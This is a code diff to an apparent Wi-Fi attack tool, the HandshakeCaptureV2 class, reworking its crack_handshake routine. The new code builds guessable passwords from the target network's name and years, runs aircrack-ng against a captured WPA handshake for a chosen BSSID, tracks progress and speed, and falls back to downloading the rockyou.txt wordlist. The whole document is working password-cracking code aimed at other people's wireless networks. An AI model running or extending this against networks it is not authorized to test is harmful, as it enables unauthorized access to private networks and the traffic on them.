@@ -13,6 +13,7 @@ from modules.utils import (
     cleanup_temp_files
 )
 import json
+from rich.progress import Progress
 
 class HandshakeCaptureV2:
     def __init__(self):
@@ -546,32 +547,10 @@ class HandshakeCaptureV2:
     def crack_handshake(self, wordlist="/usr/share/wordlists/rockyou.txt"):
         """Attempt to crack the captured handshake using both CPU and GPU methods with session support"""
         try:
-            # Check for existing sessions first
-            sessions = self.list_sessions()
-            if sessions:
-                self.console.print("\n[cyan]Found existing cracking sessions:[/cyan]")
-                for idx, session in enumerate(sessions, 1):
-                    status_color = {
-                        'running': 'yellow',
-                        'paused': 'cyan',
-                        'completed': 'green',
-                        'failed': 'red',
-                        'error': 'red'
-                    }.get(session['status'], 'white')
-                    
-                    self.console.print(
-                        f"{idx}. {session['essid']} ({session['bssid']}) - "
-                        f"Method: {session['method']}, "
-                        f"Progress: [{status_color}]{session['progress']}%[/{status_color}], "
-                        f"Status: [{status_color}]{session['status']}[/{status_color}]"
-                    )
-                
-                choice = input("\nResume session number (or press Enter for new session): ").strip()
-                if choice.isdigit() and 1 <= int(choice) <= len(sessions):
-                    return self.resume_session(sessions[int(choice) - 1])
-
             # First try simple passwords and common patterns
-            self.console.print("\n[yellow]Trying common passwords and patterns first...[/yellow]")
+            self.console.print("\n[yellow]Trying common passwords first...[/yellow]")
+            
+            # Create list of simple passwords to try first
             simple_passwords = [
                 "password", "12345678", "123456789", "1234567890",
                 self.target_essid, self.target_essid.lower(), self.target_essid.upper(),
@@ -582,28 +561,86 @@ class HandshakeCaptureV2:
             # Add variations of the network name
             essid = self.target_essid.lower()
             simple_passwords.extend([
-                essid + "123", essid + "2023", essid + "2024",
-                essid + "admin", essid + "pass", essid + "wifi"
+                essid + "123",
+                essid + "2023",
+                essid + "2024",
+                essid + "admin",
+                essid + "pass",
+                essid + "wifi",
+                essid + "@123",
+                essid + "@2023",
+                essid + "@2024",
+                essid + "password",
+                essid + "_admin",
+                essid + "_wifi"
+            ])
+            
+            # Add years and common number patterns
+            years = [str(year) for year in range(2000, 2025)]
+            simple_passwords.extend(years)
+            simple_passwords.extend([
+                "123456", "password123", "admin123", "wifi123",
+                "12345678", "87654321", "qwerty123"
             ])
             
             # Create a temporary wordlist with simple passwords
-            temp_wordlist = get_temp_path('simple_passwords.txt')
+            temp_wordlist = os.path.join(self.data_path['passwords'], 'simple_passwords.txt')
             with open(temp_wordlist, 'w') as f:
                 f.write('\n'.join(simple_passwords))
             
-            # Try simple passwords first
+            # Try simple passwords first with progress display
             self.console.print("[cyan]Testing simple passwords...[/cyan]")
-            result = self.crack_with_aircrack(self.capture_file + "-01.cap", temp_wordlist)
-            if result:
-                return True
-
-            # First check if we have a custom wordlist path in the data directory
+            
+            capfile = f"{self.capture_file}-01.cap"
+            password_file = os.path.join(self.data_path['passwords'], f'password_{self.target_bssid.replace(":", "")}.txt')
+            
+            # Try simple passwords with aircrack-ng
+            crack_cmd = [
+                'aircrack-ng',
+                '-w', temp_wordlist,
+                '-l', password_file,
+                '-b', self.target_bssid,
+                capfile
+            ]
+            
+            total_simple = len(simple_passwords)
+            with Progress() as progress:
+                task = progress.add_task("[cyan]Testing simple passwords...", total=total_simple)
+                
+                process = subprocess.Popen(
+                    crack_cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    universal_newlines=True
+                )
+                
+                while True:
+                    line = process.stdout.readline()
+                    if not line and process.poll() is not None:
+                        break
+                        
+                    if "KEY FOUND!" in line:
+                        with open(password_file, 'r') as f:
+                            password = f.read().strip()
+                            self.console.print(f"\n[green]Password found: {password}[/green]")
+                            return True
+                    elif "Tested" in line:
+                        try:
+                            tested = int(line.split('(')[1].split(' ')[0])
+                            progress.update(task, completed=min(tested, total_simple))
+                        except:
+                            pass
+            
+            # If simple passwords didn't work, proceed with full wordlist
+            self.console.print("\n[yellow]Simple passwords not found, proceeding with full wordlist...[/yellow]")
+            
+            # Check for custom wordlist
             custom_wordlist = os.path.join(self.data_path['passwords'], 'wordlist.txt')
             if os.path.exists(custom_wordlist):
                 wordlist = custom_wordlist
                 self.console.print(f"[cyan]Using custom wordlist: {custom_wordlist}[/cyan]")
             elif not os.path.exists(wordlist):
-                # Ask user for wordlist path if default doesn't exist
                 self.console.print(f"[yellow]Default wordlist not found: {wordlist}[/yellow]")
                 new_path = input("Enter path to wordlist (or press Enter to download rockyou.txt): ").strip()
                 
@@ -614,8 +651,8 @@ class HandshakeCaptureV2:
                         self.console.print("[red]Invalid wordlist path![/red]")
                         return False
                 else:
-                    # Option to download rockyou.txt
-                    self.console.print("[yellow]Attempting to download rockyou.txt...[/yellow]")
+                    # Download rockyou.txt
+                    self.console.print("[yellow]Downloading rockyou.txt...[/yellow]")
                     try:
                         download_cmd = [
                             'wget',
@@ -626,57 +663,80 @@ class HandshakeCaptureV2:
                         wordlist = custom_wordlist
                         self.console.print("[green]Successfully downloaded wordlist![/green]")
                     except:
-                        self.console.print("[red]Failed to download wordlist. Please provide a valid wordlist path.[/red]")
+                        self.console.print("[red]Failed to download wordlist![/red]")
                         return False
-
-            capfile = f"{self.capture_file}-01.cap"
-            if not os.path.exists(capfile):
-                self.console.print("[red]Capture file not found![/red]")
-                return False
-
-            # Ask user for cracking method preference
-            self.console.print("\n[cyan]Available cracking methods:[/cyan]")
-            self.console.print("1. CPU-based (aircrack-ng) - Slower but more compatible")
-            self.console.print("2. GPU-based (hashcat) - Much faster, requires compatible GPU")
             
-            choice = input("\nSelect cracking method (1/2): ").strip()
+            # Count total passwords in wordlist for progress calculation
+            total_passwords = 0
+            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+                total_passwords = sum(1 for _ in f)
             
-            if choice == "2":
-                self.console.print("\n[yellow]Starting GPU-based cracking with hashcat...[/yellow]")
-                password = self.crack_with_hashcat(capfile, wordlist)
-            else:
-                self.console.print("\n[yellow]Starting CPU-based cracking with aircrack-ng...[/yellow]")
-                password = self.crack_with_aircrack(capfile, wordlist)
-
-            if password:
-                self.console.print(f"\n[green]Password found: {password}[/green]")
+            self.console.print(f"\n[cyan]Starting password cracking with {total_passwords:,} passwords...[/cyan]")
+            
+            # Start cracking with full wordlist
+            crack_cmd = [
+                'aircrack-ng',
+                '-w', wordlist,
+                '-l', password_file,
+                '-b', self.target_bssid,
+                capfile
+            ]
+            
+            start_time = time.time()
+            with Progress() as progress:
+                task = progress.add_task("[cyan]Cracking password...", total=total_passwords)
                 
-                # Save detailed results
-                results_file = os.path.join(
-                    self.data_path['passwords'],
-                    f'details_{self.target_bssid.replace(":", "")}.txt'
+                process = subprocess.Popen(
+                    crack_cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    universal_newlines=True
                 )
                 
-                with open(results_file, 'w') as f:
-                    f.write("=== Cracking Results ===\n")
-                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"Network Name: {self.target_essid}\n")
-                    f.write(f"BSSID: {self.target_bssid}\n")
-                    f.write(f"Channel: {self.target_channel}\n")
-                    f.write(f"Password: {password}\n")
-                    f.write(f"Wordlist Used: {wordlist}\n")
-                    f.write(f"Capture File: {capfile}\n")
-                    f.write(f"Cracking Method: {'GPU (hashcat)' if choice == '2' else 'CPU (aircrack-ng)'}\n")
-                
-                self.console.print(f"[green]Full details saved to: {results_file}[/green]")
-                return True
+                while True:
+                    line = process.stdout.readline()
+                    if not line and process.poll() is not None:
+                        break
+                        
+                    if "KEY FOUND!" in line:
+                        with open(password_file, 'r') as f:
+                            password = f.read().strip()
+                            self.console.print(f"\n[green]Password found: {password}[/green]")
+                            return True
+                    elif "Tested" in line:
+                        try:
+                            # Extract progress information
+                            tested = int(line.split('(')[1].split(' ')[0])
+                            progress.update(task, completed=min(tested, total_passwords))
+                            
+                            # Calculate and display speed
+                            elapsed = time.time() - start_time
+                            if elapsed > 0:
+                                speed = tested / elapsed
+                                remaining = (total_passwords - tested) / speed if speed > 0 else 0
+                                
+                                # Format time remaining
+                                hours = int(remaining / 3600)
+                                minutes = int((remaining % 3600) / 60)
+                                seconds = int(remaining % 60)
+                                
+                                self.console.print(
+                                    f"[cyan]Speed: {speed:,.0f} passwords/sec | "
+                                    f"Time remaining: {hours:02d}:{minutes:02d}:{seconds:02d}[/cyan]",
+                                    end='\r'
+                                )
+                        except:
+                            pass
             
-            self.console.print("\n[yellow]Password not found in wordlist. You can try:[/yellow]")
-            self.console.print("1. Use a different wordlist")
-            self.console.print("2. Try a different cracking method")
-            self.console.print("3. Capture a new handshake")
+            self.console.print("\n[yellow]Password not found in wordlist.[/yellow]")
             return False
             
         except Exception as e:
             self.console.print(f"[red]Error during password cracking: {str(e)}[/red]")
-            return False 
+            return False
+        finally:
+            try:
+                process.kill()
+            except:
+                pass 
